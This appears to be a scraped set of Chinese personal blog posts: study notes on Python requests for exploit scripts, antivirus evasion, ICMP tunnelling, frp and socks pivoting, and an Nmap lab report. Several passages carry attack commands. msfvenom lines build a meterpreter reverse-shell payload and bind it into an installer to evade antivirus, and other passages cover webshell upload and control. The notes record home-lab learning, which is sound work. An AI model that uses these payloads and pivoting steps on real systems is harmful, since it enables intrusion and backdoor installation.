r.status_code 获得http中返回的状态码，可用于编写一些网页状态的脚本（如文件上传-条件竞争） r.url 请求的最终地址（应是多见于30x的跳转 r.encoding 对于request返回的text文件的编码格式 r.reason 状态码的描述，例如404的Not Found 同r.status_code r.content 返回的相应内容，且为byte类型 r.text 对于request返回的text文件 r.json 内置得JSON解码器 r.cookie 返回得cookie值 ip伪造head头部伪造当然一个网站有时会对请求会检测请求的浏览器类型，ip地址等，这是会涉及到head头部伪造 使用IP代理池伪装IP利于python中定义自己想要设置得ip地址： 123456import requestsproxies = &#123; &#x27;http&#x27;:&#x27;http://xxx.xx.xx.xxx:xxx&#x27;, .... &#x27;http&#x27;:&#x27;http://xx.xxx.xxx.xxx:xxxx&#x27;, &#125;response = requests.get(url,proxies=proxies) 对于代理ip的获取，可以使用python爬取免费的且可爬取的代理ip例如在github上一个开源的代理IP地址**ProxyPool** ，通过如下代码获取代理IP 123456789101112import requestsproxy_pool_url = &#x27;http://localhost:5555/random&#x27; #项目获取代理代理IP的本地网址# 获取代理def get_proxy(): try: response = requests.get(proxy_pool_url) if response.status_code == 200: return response.text # 返回的内容为代理IP except ConnectionError: return Nonereal_proxy = &#x27;http://&#x27; + get_proxy() 浏览器伪装大多User-Agent值可以通过开发者工具（F12）获取到比如常见的： 1234import requests headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#x27;&#125; #模拟Chrome浏览器 response = requests.get(&quot;http://www.baidu.com&quot;,headers=headers) 对于一些网站对于访问速率(频次)的限制，可以使用一个time库中的sleep进行延迟发送，当然更加逼真的话可以使用random库中的random()函数来生成随机数进行变频访问 会话保持大多数网站是通过session对象跨请求保持某些参数，即保持登陆状态，官方的说就是你使用requests尝试登录并且验证成功，服务端会返回一些Cookie，这些Cookie可以使你的下次请求不需要验证，而Session对象能保持这些Cookie，而不用你每次提交请求时构建一个新的Cookie。 例如使用rs = requests.Session() 来打开会话，在获取返回结果时用restult = session.post/get()。利用在登录一个post传参的网站时，可以使用如下代码： 12345678910111213import requestsrs = requests.session() #建立会话data =&#123; &#x27;usename&#x27;: &#x27;xxxxxx&#x27;, &#x27;password&#x27;: &#x27;xxxxx&#x27; &#125;url =&quot;https://passport.xx.com/user/login&quot; # 登录url地址restult = session.post(url,data=data) #不再使用request而是sessionurl2 = &quot;https://xx.com/ck/shopping/id/235667&quot;# 再次请求 登录后的网站获取数据result_data = session.get(url2)print(result_data.json()[&#x27;data&#x27;]) 文件上传和下载对于一些CVE脚本会进行一些文件上传的操作(如上传一句木马)，但这是并不是htnl代码般浏览器访问选择文件然后上传。以post方式（表单）上传多是先将二进制文件读取到内存中，再将内存中的文件发送到服务器保存。 单文件上传例如下列代码： 123456789import requestsfo = open(&quot;shell.php&quot;, &quot;w&quot;) # 打开一个文件,其中‘w’为创建或覆盖文件，‘a’用于追写文件内容，‘xb’为以二进制方式打开，x为读写模式，‘r’为只读该文件 fo.write( &quot;&lt;?php phpinfo(); ?&gt;&quot;) # 关闭打开的文件fo.close()files &#123;&#x27;file1&#x27;:open(&#x27;shell.php&#x27;,&#x27;rb&#x27;) &#x27;image/png&#x27;&#125; #上传文件以二进制方式上传.&#x27;image/png&#x27;为上传类型，可以不指定response requests.post(&#x27;http://www.hackxxx.com/upload.php&#x27;,files=files)print(response.text) 多文件上传多文件上传同于单文件上传，只需修改一下file参数即可： 1234files &#123;(&#x27;file1&#x27;,(&#x27;shell1.php&#x27;open(&#x27;shell1.php&#x27;,&#x27;rb&#x27;),&#x27;image/png&#x27;)) (&#x27;file2&#x27;,(&#x27;shell2.php&#x27;open(&#x27;shell2.php&#x27;,&#x27;rb&#x27;),&#x27;image/jpeg&#x27;)) (&#x27;file3&#x27;,(&#x27;shell3.php&#x27;open(&#x27;shell3.php&#x27;,&#x27;rb&#x27;),&#x27;image/png&#x27;)) &#125; #这里同样可以指定或不指定文件名称和文件类型，不指定文件名称应该是以打开文件名称作为文件名 其实还有以流的方式上传和监听时上传(requests-toolbet),但还未学习。 文件下载对于较小文件可以直接利用写的操作完成： 12345import requestsreq = requests.get(&quot;http://www.hackxxx.com//shell.jpg&quot;)with open(r&quot;c:\\shell.jpg&quot;, &quot;wb&quot;) as f: #以二进制方式打开 f.write(req.content) 当 Python 写入文件时，会将数据暂存在内存中，直至缓存存满后才真正写入文件。如果需要写入的数据很大，可能会导致内存不足。因此对于大文件的下载，可以采取分块读写的方法，每次只读写一小块。 123456import requestsreq = requests.get(&quot;http://www.hackxxx.com//shell.jpg&quot;, stream=True)with open(r&quot;c:\\shell.jpg&quot;, &quot;wb&quot;) as f: for chunk in req.iter_content(chunk_size=1024): # 每次加载1024字节 f.write(chunk) 这里with会自动判断是否关闭文件，所以不用在写f.close() 函数了。但浏览一些网上文章显示后讲到会遇到文件关闭后在一直占用进程，可能与部署的应用和版本有关吧？ 命令行传参大多脚本都时在cmd&#x2F;bash下进行命令行传参，这样方便管理和使用。在传参是多会用到if __name__ == &quot;__main__&quot;:函数 python属于脚本语言，同于php语言，对代码是逐句解释运行，一直从首行运行到尾行，这样会出现一些函数需要在特定条件下执行而无法被提前或滞后执行。而if __name__ == &quot;__main__&quot;:可以作为程序入口进行选择性执行一些函数。但它与C语言中的mian()不同的是可以多个文件中出现。 对于cmd中的参数，会使用到sys库中的argv，但要注意到是argv本身为一个数组，接受的一个了参数（argv[0]）是文件本身的名称，因此cmd下执行时第一个参数接受代码应为：sys.argv[1] 例如以前的在upload-lab中条件竞争模块使用的脚本： 123456789101112131415161718192021## shell.py## @Author : recyvan## @Time : 2023-12-22## #Description : upload-lab pass-17.import requestsimport sysdef re(url): while True: req=requests.get(url) headers = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#x27;, &#x27;Cookie&#x27;: &#x27;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZYY6_w.x_AGwnOGnXqmNAIWoT4Mi4Q68HU&#x27;&#125; reqcode=req.status_code if reqcode == 200: print(&quot;uopload success！&quot;) break else: print(reqcode) if __name__ == &quot;__main__&quot;: url=sys.argv[1] re(url) 例如执行python shell.py -u http://127.0.0.1/xxx/shell.php 执行后 url等于“ http://127.0.0.1/xxx/shell.php”。 关于其他脚本的学习（类，函数定义，列表，库等）学习后单独更新。","tags":["网络安全，python"],"categories":["python"]},{"title":"windows域与用户组策略笔记(废弃)","path":"/2023/12/21/windows-yu-yu-yong-hu-zu-ce-lue/","content":"以前学习时，遇到过在windows7旗舰版非administer和administer账户下的执行或搭建一些web服务会遇到可执行函数无法执行（反馈回来的是得不到回显）。 域当一个工作组中的计算机变多时，域（Domain）便成了一个更好的计算机资源管理模式，在于环境中所有的用户，用户组，计算机，打印机等设备都在一个或多个域控制器的中央数据库中注册，当域用户需要访问域中的资源时，必须通过域控制器集中进行身份验证。 域可以分为单域，父域和子域，域树，域林等多种。 活动目录活动目录（ Active Directory , AD ）是指安装在域控制器上，为整个域环境提供集中式目录管理服务的组件。活动目录存储了有关域环境中各种对象的信息，如域、用户、用户组、计算机、组织单位、共享资源、安全策略等，目录数据存储在域控制器的 Ntds.dit 文件中，活动目录主要提供了以下功能： 计算机集中管理：集中管理所有加入域的服务器及客户端计算机，统一下发组策略。 用户集中管理：集中管理城用户、组织通讯录、用户组，对用户进行统一的身份认证、资源授权等。 资源集中管理：集中管理域中的打印机、文件共享服务等网络资源。 环境集中配置：集中的配置城中计算机的工作环境，如统一计算机桌面、统一网络连接配置，统一计算机安全配置等。 应用集中管理：对城中的计算机统一推送软件、安全补丁、防病毒系统等。 Ntds.dit该文件是一个二进制文件，保存在域环境的域控制系统上，是主要的活动目录数据库，该文件包含有关域用户的，用户密码的哈希散列值，用户组，组成员身份和组策略信息，是使用SYSTEM文件中的密钥对这些hash值进行加密。存储位置为域控的(一般情况或绝大情况下) %SystemRoot% tds.dit 在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。而在非域环境下，用户的登录凭据等信息储存在本地的SAM文件下。 ​ 有关域的内容等学会更多再更新。 用户组策略 前置：对于文章开篇问题，简单解决方案：启动administer用户并设置密码，禁用或删除其他管理员账户以解决权限问题（当然对于部分系统内置文件其最高权限也是无法需改，可以进PE启动盘删改（大概 访问令牌访问令牌(Access Tokens)是Windows操作系统安全性的一个概念。当用户登陆时，系统创建一个访问令牌，里面包含登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表。此后代表该用户执行的每个进程都有此访问令牌的副本，每当线程或进程与安全对象交互或尝试执行需要特权的系统任务时，windows都会使用此令牌标识并确定关联账户。SID用来标识用户账户和该用户所属的组。（关联知识：DACL和SACL） 组策略 组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上管理组策略对象。 ​ –百度百科 影子账户设立之前想单独了解用户组和sam文件，但后来和组策略搞混了，只能以后学习了。。。","tags":["网络安全"],"categories":["windows"]},{"title":"免杀基础了解笔记","path":"/2023/12/15/mian-sha-ji-chu-liao-jie-bi-ji/","content":"免杀基础笔记 免杀基础概念免杀一般指反病毒技术，在一些特定情况下或者实际场景下获得目标靶机后，因存在杀毒软件的检测，所以很多脚本等都无法使用，这是需要一种木马或脚本免于被杀毒软件查杀的技术。 免杀涉及到的内容比较多，基本的免杀多是修改木马内容，改变其特征码，捆绑，加壳，分离等。 免杀感觉更偏向于逆写和二进制（不是全部），对于web安全入门，多使用msf和cs进行免杀测试，之后能力提升后，可以自己编写免杀脚本。 杀毒软件检测方式静态查杀一般根据特征码识别，对文件进行特征码匹配。将扫描信息与病毒数据库进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。 云查杀查杀原理是对文件内容和行为的检测 行为查杀&#x2F;动态查杀对目标产生的行为进行检测，即对即将执行的指令进行检测 扫描查杀方式 1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术。 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑。 3、修复技术：即是对恶意程序所损坏的文件进行还原 4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒。 5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短。 6、全盘扫描：扫描电脑全部磁盘，耗时较长。 7、勒索软件防护：保护电脑中的文件不被黑客恶意加密。 8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序 监控技术 内存监控：当内存中注入病毒时，进行删除等操作 文件监控：当文件被越权改动，或写入磁盘时存在病毒时进行查杀 网页保护：阻止非法网站的窃取和非法文件下载 其他的还有主动防御技术，机器学习识别技术(人工智能识别技术)，进程行为检测法()沙盒模式，文件校验法等等 基础免杀于msfvenom工具简单免杀多是改变进程名称，图标，文件名称，文件属性，加壳，对木马进行编码，修改源码的特征码，对shellcode进行二次编译，使用免杀生成器，加载器等。 msFvenom是msfpayload和msfencode的组合，msFvenom目前已经无法单独使用绕过免杀。 -p 指定使用的payload -l 列出指定模块的可用资源：payloads encodes nops all -n 为payload预定一个NOP的滑动长度 -f 指定输出格式 -e 指定需要的编码格式 -a 指定payload的目标架构 x86|x64|x86_64 -platform 指定目标平台 -s 设置文件大小 -i 设置编码次数 -o 指定payload存放位置 简单使用 kali下执行 1msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.56.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\\x00&#x27; -f exe -o shell.exe 该命令是指制作一个windows x86架构的反向shell，其中设置监听主机为ip和port，编码格式下为 shikat_ga_nai (不包含\\x00字符即空字符)(此处编码了30次)的名为shell.exe的可执行脚本。 放到&#x2F;上传到指定系统双击运行即可。(因为安装的360杀毒很久之前就已经可以检测出来了，就不展示了^__^ msfvenom进行捆绑软件木马 1msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.65.128 LPORT=7777 -e x86/shikata_ga_nai -i 30 -b &#x27;\\x00&#x27; -x setchrome.exe -f exe -o shell.exe 图中ip的65写成了56，唉又重新做了一遍，哭。 发现360杀毒并未检测出来病毒（360杀毒安装时间为23-12-15日，但过了大约1分钟后被查杀出）（但第二次上传后，未进行扫描，且断开网络后360并未查杀，（个人猜测：感觉是本地库下扫描未检出，但联网后的云检测可以检测出来（个人猜想不一定正确^__^）） 下一步开始执行安装程序（下载kali开启监听 操作时突然发现一个盲点：kali目前只有一个网卡，windows10有两个，但要互ping就要使用VM8网卡，而这个网卡又连着网络，一连网就查杀。无奈再给kali一个网卡vm2，重新走一遍流程。哭，kali默认的atuo lo就只有一个网卡，还得重新静态路由。！！！ 重来： 重新生成-&gt;window10禁止上网-&gt;打开360-&gt;木马查杀-&gt;kali msf监听-&gt;双击运行（对，这一切的一切windows10没开windows defender。） 额返回值还是为空？？？","tags":["渗透测试，免杀"],"categories":["免杀"]},{"title":"ping-ptunnel与icmp隧道绕过","path":"/2023/12/14/pingtunnel-yu-icmp-sui-dao-rao-guo/","content":"填坑，之前frp和socks隧道代理后，proxychain4 ping无法返回包，此次学习了pingtunnel与icmp隧道绕过 网络拓扑图如下 前置知识icmp协议ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用 （百度百科） icmp隧道在实际的后渗透阶段：因为防火墙（大多不止一个）存在，未必开启了可以使用的端口（有时是因为要到的shell权限过低等无权操作防火墙）进行利用。那么可以利用icmp隧道建立联系。因为icmp协议工作在网络层，依附于IP工作，（像上一篇文章的坑：ping无数据包返回）。 因此，我们可以包tcp&#x2F;unp数据包封装到icmp协议中（还在学习中，解释如下）： 请求端的 Ping 工具通常会在 ICMP 数据包后面附加上一段随机的数据作为 Payload，而响应端则会拷贝这段 Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。 Windows 和 Linux 系统下的 Ping 工具默认的 Payload 长度为 64 比特，但实际上协议允许附加最大 64K 大小的 Payload。 对于隧道数据，icmptunnel 首先会指定客户端和服务器端。随后，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。 解释内容参考：先知社区《内网渗透之icmp隐藏隧道》 ptunnel工具ptunnel是一款建立ICMP隧道传输数据的工具。 命令释义： 参数-p：指定代理服务器，即此示例中的代理服务器B（192.168.1.2） 参数-lp：指定本地监听端口 参数-da：指定欲访问的目标服务器 参数-dp：指定欲访问的目标端口 待更新。。。。","tags":["渗透测试，icmp协议"],"categories":["内网穿透"]},{"title":"frp内网穿透","path":"/2023/12/13/frp-nei-wang-chuan-tou/","content":"frp在liunx和windows下实现穿透网络拓扑图如下 下载frp包（包含liunx&#x2F;windows下的可执行程序和配置文件） 攻击实施第一次穿透kali使用msf进行永恒之蓝攻击，上传frpc服务到window7，kali开启frps服务,win7上传frpc服务 1.永恒之蓝攻破windows7,上传frpc服务。编写frpc.ini文件 先执行服务端：编写frps.ini文件，并启动 windows7执行客户端，发现执行成功，服务端同时端口监听成功 对第一次代理设置全局代理 尝试远程连接第win7主机 现对win7添加vm3网卡，新添主机almaliunx主机(网卡为vm3)与win7相连进行 win7：VM3下IP：192.168.126.128 almaliunx：VM3下IP：192.168.126.129 攻击实施第二次穿透访问socks代理下win7网站（实际上方便学习frp技术，已内置了一句话木马） 使用哥斯拉进行木马控制: tips:使用命令为：proxychain4 java -jar godzilla.jar 上传frpc服务，编写frpc.ini 注意，这里的server_addr的IP为客户端可以ping到的服务端主机即Windows7。要上传到temp目录下。 上传成功后，先开启服务端frps服务（再window7上开启，先配置好frps.ini文件），再开启frpc客户端。 设置proxychain4配置文件： 此时回到kali主机进行nmap扫描almaliunx主机，发现成功 至此已经完成。 流程详解此次攻击主要穿透两层，使得kali可以绕过两台主机访问almaliunx主机，这里使用启动了两次frp服务（反向socks代理，一次为kali做服务端，windows7做客户端，windows7连接kali，使得kali通过代理可以访问于windows7相通的win7主机，进而攻击win7活动webshell,使win7做frp客户端，windows7做frp服务端，进而windows7可以访问与win7相同的almaliunx主机，最后使得流量返回kali。 这里 Windows7既做服务端，又做客户端，进而桥接起kali与win7的连接 proxychain4的全局代理最后要多次socks5代理 godzilla.jar软件对get传参的支持性不佳，建议改为post（至少攻击时get连接失败，害得我反复修改ini文件 (– __–) frp新版在一些情况下不支持ini文件，建议改为toml文件。 存在疑问：不知道为什么proxychain4下nmap rdesktop都可以执行，但是ping多次尝试也得不到回复？ 后来一想：代理是socks5,指定为tcp流了，ping是icmp协议。尬住了&lt;&#x3D;+__+&#x3D;&gt;。","tags":["渗透测试，路由"],"categories":["内网穿透"]},{"title":"内网穿透一","path":"/2023/12/10/nei-wang-chuan-tou/","content":"内网穿透在一次场景搭建（其概念图大致为：以liunx-1做跳板机，进入win10-1,在从win10-1访问与之相连的win7-1的80端口和linux-2的21端口）。在主机渗透时使用msf攻击时，若要访问win10,win7主机需要配置相关路由，因此要掌握内网穿透的知识。 NAT转换的多种模式 （三种模式的讲解参考《网络地址转换用户指南》 《静态NAT、动态NAT、PAT(端口多路复用)之间的区别》 《三张图解释静态 NAT、动态 NAT、PAT》） 静态转换静态NAT将网络信息流从静态外部 IP 地址映射到内部 IP 地址或网络。它创建实际地址到映射地址的静态转换。静态NAT通过具有未注册专用 IP 地址的专用 LAN 提供与网络设备的互联网连接。 静态NAT可定义从一个 IP 子网到另一个 IP 子网的一对一映射。映射包括一个方向的目标 IP 地址转换，以及反向的源 IP 地址转换。从NAT设备，原始目标地址是虚拟主机 IP 地址，而映射至地址是真正的主机 IP 地址。手动写入 IP 地址映射条目，配置 NAT 表，一个内网地址对应着一个外网地址，举例，192.168.x.x 对应 1.1.x.x。当 192.168.x.x 向外网发包，则过路由的时候，会根据静态 NAT 表，将 192.168 .x.x更换为 1.1.x.x。–&gt;但并不意味着一个公网IP只能对应一个IP。 动态转发指将内部私有IP转换为公网IP地址时，IP的对应关系是不确定的。也就是说只要指定哪些内部地址可以进行NAT转换，以及哪些可以的合法的IP地址可以作为外部地址，就可以进行动态转换了。也可以使用多个合法地址集。 在动态转发中，一个公网IP可以对应一个网关IP，例如：192.168.1.0&#x2F;24 这个网段对应着 100.1.x.x；192.168.1.1 发包；在 NAT 地址转换里，形成了一条映射（条目），就是，192.168.1.1 映射 100.1.x.x，这个时候，由于 192.168.1.1 占用着 100.1.x.x，则别人无法再使用这个 100.1.x.x，直到 192.168.1.映射表项老化后 ，则可以把 100.1 .x.x给别人；别人无法使用的原因是，如果别人也在使这个 100.1， 得不到回包。内网主机发起连接请求时，会自动分配一个公网IP和端口。 端口多路复用(PAT)端口多路复用(OverLoad)是指改变外出数据包的源端口并进行端口转换，即端口地址转换(PAT，Port Address Translation).采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节约IP地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自internet的攻击。因此，目前网络中应用最多的就是端口多路复用方式。 例如在一个网段中，192.168.1.1向外发送请求，经过路由时，会将192.168.1.1映射到8.0.130.x(公网IP)的一个端口上，当12.168.1.1的会话不结束，那该IP会一直占用8.0.130.x这个IP和端口号（端口号已使用，其他主机无法在使用，直至会话结束）。 内网穿透-msf配置路由和sock代理穿透内网配合 本机环境搭建下网络拓扑图为： 操作大致流程： kali msf(msf17_010)–&gt;get shell(windos7)–&gt;上传+socks穿透-&gt;win7 反弹.exe –&gt;kali msf监听端口 攻击流程进行windows7永恒之蓝攻击（因为已知存在永恒之蓝，便不再扫描是否存在 执行返回shell 向window7上传natbypass可执行文件到temp目录下（temp目录具有可执行权限）该步骤用于之后win7反弹shell使用（先埋个坑，等以后学到时再更新。 arp -a后找到存在的内网主机,发现目标主机192.168.56.102，但该主机只能window7可以ping通，因此要内网穿透。 设置自动路由，发现设置成功。 设置socks代理 设置&#x2F;ect&#x2F;proxychains4.conf文件：将dynamic_chain取消注释，proxy_dns加入注释，在[ProxyList]选项中加入代理: 之前扫描开放了80端口：使用kali下载内容: 发现可以正常访问。在firefox下设置好proxy后同样可以访问web服务 然后就可以找漏洞上传shell了。（其实这里可以用natbypass.exe来进行）当然如果win7开启了远程连接，那么直接rdesktop连接。 流程详解socks代理SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。socks协议属于会话层的协议，位于表示层和传输层之间。socks代理相较于http代理还可以转发UDP代理，socks代理有socks4,socks4a,socks5多个分支。此次实验使用的时socks5版本。 msf中内置了三个socks代理模块，分别是socks4a、socks5、socks_unc。一般常使用 socks4a和socks5进行代理。其二者只是由于所支持的具体应用不同而存在差异。socks4只支持TCP协议而socks5支持TCP&#x2F;UDP协议，还支持各种身份验证机制等协议，也就是说这里使用socks5的话还需要设置用户名与密码。 ​\t等以后学习socks代理后,单独写文章深入研究. 全局代理proxychain4用于对指定工具进行代理,例如实验中proxychains4 nmap -sn xxx.xxx.xx.xxx,是指proxychains4通过socks5代理,对内网主机win7进行nmap扫描。 ProxyChains 是一个 UNIX 程序，它通过预加载的 DLL（dlsym()、LD_PRELOAD）在动态链接程序中挂钩网络相关的 libc 函数，并通过 SOCKS4a&#x2F;5 或 HTTP 代理重定向连接。它仅支持 TCP(不支持 UDP&#x2F;ICMP 等)。 通过修改配置文件&#x2F;ect&#x2F;proxychains4.conf,来指定代理的具体功能,例如代理方式,IP,端口等。 远程连接win7这种情况十分少,多是可以通过代理可以ping通主机后,寻找漏洞点,再反弹shell。 msf正向路由和反向路由 正向连接是受害主机监听一个端口，由攻击主机主动去连接受害主机的过程，适用于受害主机具有公网ip的情况. 反向连接是控制机主机监听一个端口，由受害主机反向去连接攻击主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况. 内网穿透-frpfrp 是一个反向代理工具.可以轻松地进行内网穿透.对外网提供服务,frp支持 tcp协议, http协议, https 等协议类型,并且 web 服务支持根据域名进行路由转发。之前在搭建赵师傅CTFd时，对于动态靶机的使用用到了frp技术。 主要文件为frpc（客户端），frps（服务端），配置文件为frpc.ini,frps.ini文件。 攻击流程修改frp客户端： 上传frpc文件（反向的代理 运行服务端，win7执行客户端。（shell乱码解决：chcp 65001 显示失败？？？？？靠，以后再弄，哭！！ &#x2F;&#x2F;12-13日 补坑，frp的穿透已经实施成功，补充到了这篇文章中《frp内网渗透》（点击进入）。","tags":["渗透测试，路由"],"categories":["内网穿透"]},{"title":"实验课一","path":"/2023/12/07/shi-yan-yi-wang-luo-sao-miao-yu-wang-luo-zhen-cha/","content":"网络渗透测试实验报告 一 实验目的和要求理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。 二 实验步骤1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。使用Google搜索： 查找相关网页： 2.照片中的女生在哪里旅行？截图搜索到的地址信息。 Google搜索：letrentehuit café brasserie发现： 地址是：38 avenue de Suffren.75015 Paris.France。 3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。华为手机应该拨号*#* #2846579# *#*进入工程模式 但是honor系列并不能在工程菜单找到相关信息。 在基站查询工具得到如下信息： 4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。 5.地址信息5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。 该用户使用的apple品牌的的设备，访问的是广西桂林市教育网桂林电子科技大学网站。 5.2访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。 可以发现两个值并不一样，cmd下查询的IP是局域网内的私有IP，网站查询的为为公网IP，是当前网络连接的出口IP。但此处公网IP为US归属，是因为接入了VPN使用。 这里涉及到的知识点是：可以通过NAT实现从私网IP到公网IP之间的联系。在报文离开私网进入Internet时，将源IP替换为公网地址，通常是出口设备的接口地址；一个对外的访问请求在到达目标以后，表现为由本组织出口设备发起，因此被请求的服务端可将响应由Internet发回出口网关； 出口网关再将目的地址替换为私网的源主机地址，发回内部。 6.NMAP使用6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。 端口21的ftp（文件传输协议）服务，用于文件传输使用，是一种基于TCP的协议，采用客户&#x2F;服务器模式。通过FTP协议，用户可以在FTP服务器中进行文件的上传或下载等操作。（部分情况下可匿名登录 端口22的ssh服务：用于远程登录管理计算机或服务器等，专为远程登陆会话和其他网络服务提供的安全性协议。利用SSH协议可以有效的防止远程管理过程中的信息泄漏问题。 端口3306的mysql服务，mysql数据库用于管理网站等用户数据和信息。开放3306端口，可以远程登录并管理mysql服务。远程登录的话漏洞大多为弱口令，然后数据库写马。各个数据库端口开放不同。 端口80的http服务，这里的端口开放表示靶机有基于apache&#x2F;nhinx等的网站开放。 6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。 OS类型为liunx系统，版本范围为；2.6.9-2.6.33 6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。 6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。 这是msf中对于ms17_010_eternalblue.rb的简介： 永恒之蓝”利用了某些版本的微软服务器消息块（SMB）协议中的数个漏洞，而当中最严重的漏洞是允许远程电脑执行代码。大多利用复现多使用msfconsole进行。其利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。 7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。 服务为CNIX HTTP Server 1.0版本过低，存在历史漏洞。 8.Winhex简单数据恢复与取证8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。 使用winHex打开后发现，文件格式头出现错误，修改一下即可。（将前四个数字改为FFD8） 8.2笑脸背后的阴霾：图片smile有什么隐藏信息。 8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。 因为U盘中存在之前删除的文件，所以直接用DiskGenius软件进行恢复： 9.讨论学校热点GUET-WiFi的安全问题，以截图说明。校园网存在端口隔离的安全保护。 同一校园网下，设备之间可以进行IP访问通讯，因此存在校内钓鱼网站的危险。例如使用setoolkit进行模拟www.baidu.com网站,获取查询信息。 2.可能存在Arp欺骗。可以使用arpspoof工具进行欺骗。 详细见网络安全测试课程-作业-4 3.校园网存在端口隔离的安全保护。 校园网下 手机热点 扫描另一台物理主机，查看端口开放情况扫描另一台物理主机，查看端口开放情况。 发现开放了80端口和135端口等多个端口，其中80端口为一道序列化题目，构造pop链后，可以通过include包含来获取权限。 135端口：主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，RPC本身在处理通过TCP&#x2F;IP的消息交换部分有一个漏洞，该漏洞是由于错误地处理格式不正确的消息造成的。“冲击波”病毒，利用RPC漏洞可以攻击计算机。 三 实验小结1.道德黑客的理解： 道德黑客，在我的认知中狭义地等同于白帽子。专门从事渗透测试及其他测试方法，确保信息系统安全。通过渗透测试来保证系统和设备安全。白帽黑客在网络用语中指站在黑客的立场攻击自己或被别人允许攻击的系统以进行安全漏洞排查的程序员。他们用的是黑客惯用的破坏攻击的方法，行的却是维护安全之事。 2.实验总结 google hacker语法的简单实用 Kali exiftools工具使用 Kali msfconsole 简单使用 网络空间引擎的简单使用 公用IP和私有IP的区别","tags":["网络渗透测试"],"categories":["网络扫描与网络侦察"]},{"title":"网络安全测试课程-作业-5","path":"/2023/12/04/wang-luo-an-quan-ce-shi-ke-cheng-zuo-ye-5/","content":"操作系统协议栈指纹(Namp使用手册)[https://nmap.org/man/zh/man-port-scanning-techniques.html] 前置知识–主动扫描摘记（主动指纹识别是指主动往远程主机发送数据包并对相应的响应进行分析的过程，使扫描器在更短的时间内获得比被动扫描更准确的结果。）： 网络层：ping命令，icmp协议，速度快(可跨网段)：防护墙可以静ping（检测报文中协议类型为01，即icmp协议便丢弃）。 ping失败后，可查看arp缓存表(arp -a)是否存在mac地址(仅限同一个子网) 运输层(TCP，UDP)：端口扫描， :one:TCP协议扫描，全连接扫描 :two:UDP协议扫描 :three: SYN扫描 